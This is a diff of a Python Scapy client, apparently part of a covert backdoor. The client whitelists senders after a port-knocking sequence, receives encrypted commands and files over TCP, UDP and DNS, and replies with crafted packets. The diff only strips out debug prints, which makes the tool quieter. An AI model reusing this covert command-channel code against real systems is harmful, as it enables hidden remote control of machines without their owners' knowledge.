@@ -106,7 +106,6 @@ class Client:
                 if b'|||' in data:
                     filename = data.split(b'|||')[0]
                     filename = filename.decode()
-                    print("UDP/DNS Terminator received....")
                     self.combine_bits(filename)
                     self.file_bits = []
                 else:
@@ -117,7 +116,6 @@ class Client:
             if UDP in packet and packet[UDP].dport == self.recv_port:
                 data = packet[Raw].load
                 if b'|||' in data:
-                    print("UDP CPMMAND Terminator received....")
                     self.combine_bits("")
                     self.cmd_bits = []
                 else:
@@ -130,13 +128,11 @@ class Client:
           # Handles files
         if IP in packet and packet[IP].src in self.whitelist \
                 and packet[TCP].dport == self.recv_port and packet[TCP].sport == self.file_port:
-            print(f"received data from whitelisted ip: {packet[IP].src}")
             if Raw in packet:
                 data = packet[Raw].load
                 if b'|||' in data:
                     filename = data.split(b'|||')[0]
                     filename = filename.decode()
-                    print("Terminator received....")
                     self.combine_bits(filename)
                     self.file_bits = []
                 else:
@@ -148,7 +144,6 @@ class Client:
             if TCP in packet and Raw in packet and packet[TCP].dport == self.recv_port:
                 data = packet[Raw].load
                 if b'|||' in data:
-                    print("Terminator received....")
                     self.combine_bits("")
                     self.cmd_bits = []
                 else:
@@ -165,7 +160,6 @@ class Client:
             if packet[TCP].flags & 0x02 and packet[TCP].dport == self.sequence[self.cur_pos]:
                 self.cur_pos += 1
                 if self.cur_pos == len(self.sequence):
-                    print("Whitelisting a dude")
                     self.whitelist.append(packet[IP].src)
                     self.cur_pos = 0
                 return
@@ -188,7 +182,6 @@ class Client:
 
     def get_command_response(self):
         data = self.join_bytes(self.cmd_bits)
-        print(f"joiuned data {data}")
         val = self.authenticate_packet(data)
         if val:
             self.process_packets(val)
@@ -197,7 +190,7 @@ class Client:
         data = self.join_bytes(self.file_bits)
         with open(name, 'wb') as f:
             f.write(data)
-        print("file saved")
+
 
     def join_bytes(self, data: list) -> bytes:
         """Converts byte array into byte sequence"""
@@ -205,19 +198,15 @@ class Client:
 
     def authenticate_packet(self, data: bytes) -> str:
         decrypted_msg = self.decrypt_data(data)
-        print(f"decrypted: {decrypted_msg}")
         if decrypted_msg.startswith(self.flag_begin) and decrypted_msg.endswith(self.flag_close):
             return decrypted_msg
 
     def craft_packet(self, msg: str) -> None:
         if self.proto == "tcp":
-            print(f"sending {self.proto}")
             self.create_tcp(msg)
         elif self.proto == "udp":
-            print(f"sending {self.proto}")
             self.create_udp(msg)
         else:
-            print(f"sending {self.proto}")
             self.create_dns(msg)
 
     def create_dns(self, msg: str):
@@ -236,7 +225,6 @@ class Client:
 
     def create_tcp(self, msg: str) -> None:
         """Creates TCP packet,embeds data in payload, and sends"""
-        print("Creating TCP packets")
         msg = msg.encode()
         pkt = IP(dst=self.target_ip) / TCP(sport=RandShort(), dport=self.send_port) / Raw(load=msg)
         try:
@@ -251,7 +239,6 @@ class Client:
         udp = UDP(sport=self.recv_port, dport=self.send_port)
         payload = msg
         pkt = ip / udp / payload
-        print(f"{payload}")
         try:
             send(pkt, verbose=0)
         except (OSError, PermissionError) as e:
